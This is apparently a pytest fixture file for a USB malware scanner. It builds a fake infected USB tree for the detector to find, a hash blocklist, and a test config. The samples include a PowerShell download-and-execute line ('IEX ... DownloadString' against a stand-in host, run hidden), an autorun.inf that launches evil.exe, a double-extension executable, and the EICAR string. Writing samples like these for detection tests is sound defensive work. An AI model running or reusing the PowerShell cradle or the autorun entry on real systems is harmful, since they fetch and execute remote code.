"""Shared pytest fixtures. Makes the project importable and builds a realistic
fake-USB tree + a config pointing at temp dirs."""

import hashlib
import os
import sys

import pytest

# Make the project root importable (tests/ -> ..).
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

EICAR = (r"X5O!P%@AP[4\PZX54(P^)7CC)7}"
         + "$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!" + "$H+H*")


def sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


@pytest.fixture
def fake_usb(tmp_path):
    """A directory that looks like an infected USB stick."""
    usb = tmp_path / "usb"
    usb.mkdir()
    (usb / "autorun.inf").write_text("[autorun]\nopen=evil.exe\nshellexecute=evil.exe\n")
    (usb / "dl.ps1").write_text(
        'IEX (New-Object Net.WebClient).DownloadString("http://x") -w hidden')
    (usb / "invoice.pdf.exe").write_bytes(b"MZfake")
    (usb / "notes.txt").write_text("perfectly normal notes")
    bad = b"known-bad-payload-bytes"
    (usb / "mal.bin").write_bytes(bad)
    return {"dir": usb, "mal_sha256": sha256_bytes(bad)}


@pytest.fixture
def signatures(tmp_path, fake_usb):
    """A signatures dir with the mal.bin hash blocklisted + the YARA rules."""
    sig = tmp_path / "signatures"
    (sig / "yara").mkdir(parents=True)
    (sig / "hash_blocklist.txt").write_text(
        f"# test\n{fake_usb['mal_sha256']}  # mal.bin\n")
    # copy the real project YARA rules so we test the shipped ruleset
    real_yara = os.path.join(ROOT, "signatures", "yara", "usb_threats.yar")
    with open(real_yara) as fh:
        (sig / "yara" / "usb_threats.yar").write_text(fh.read())
    return sig


@pytest.fixture
def config(tmp_path, signatures):
    """A Config object with everything pointed at temp dirs, daemon off."""
    from scanner.config import Config
    data = {
        "scanner": {"prefer_daemon": False, "workers": 2, "use_cache": True,
                    "multiscan": False, "max_file_size_mb": 200,
                    "database_path": str(tmp_path / "nodb")},
        "heuristics": {
            "enabled": True,
            "hash_blocklist": str(signatures / "hash_blocklist.txt"),
            "yara_rules_dir": str(signatures / "yara"),
            "deep_scan_all": False, "deep_scan_max_mb": 50,
        },
        "quarantine": {"path": str(tmp_path / "q"), "neutralize": True},
        "logging": {"path": str(tmp_path / "logs"), "jsonl": True, "level": "INFO"},
        "reporting": {"path": str(tmp_path / "reports")},
        "watcher": {"poll_interval": 1},
    }
    return Config(data=data)
